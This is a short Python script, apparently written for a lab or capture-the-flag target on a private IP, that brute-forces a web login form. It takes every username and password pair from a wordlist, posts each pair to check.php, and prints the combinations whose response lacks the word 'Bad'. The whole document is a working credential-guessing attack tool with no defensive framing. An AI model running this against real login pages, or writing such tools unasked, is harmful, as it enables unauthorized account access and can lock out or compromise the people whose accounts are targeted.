import requests

# Read usernames and passwords from the file
with open('raft-small-words.txt', 'r') as file:
    lines = file.read().splitlines()

s = requests.Session()

# Simulate a POST request with nested loops
for username in lines:
    for password in lines:
        # Send the POST request with username and password variables here
        payload = {
            'login_field': username,
            'cred_field': password
        }

        response = s.post('http://172.25.0.32/check.php', data=payload)
        
        if "Bad" not in response.text:
            print(f"Valid login found - Username: {username}, Password: {password}")
            # You may want to break out of the loop here if a valid login is found
        #else:
        #    print(f"Invalid login - Username: {username}, Password: {password}")

# Close the session when done
s.close()